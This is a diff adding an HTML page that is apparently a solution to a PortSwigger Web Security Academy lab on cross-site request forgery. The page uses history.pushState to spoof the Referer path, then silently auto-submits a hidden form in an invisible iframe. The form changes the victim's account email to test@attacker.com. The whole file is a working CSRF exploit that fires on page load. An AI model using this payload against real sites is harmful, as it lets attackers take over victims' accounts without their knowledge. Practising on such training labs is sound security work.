@@ -1,0 +1,14 @@
+<html>
+  <body>
+    <script>
+      history.pushState('', '', '/?xxxxxxxxxxxxxxxURLxxxxxxxxxxxxxx.web-security-academy.net');
+    </script>
+    <iframe style="display:none" name="csrf-iframe"></iframe>
+    <form action="https://xxxxxxxxxxxxxxxURLxxxxxxxxxxxxxx.web-security-academy.net/my-account/change-email" method="POST" id="csrf-form" target="csrf-iframe">
+      <input type="hidden" name="email" value="test@attacker.com" />
+    </form>
+    <script>
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
+</html>
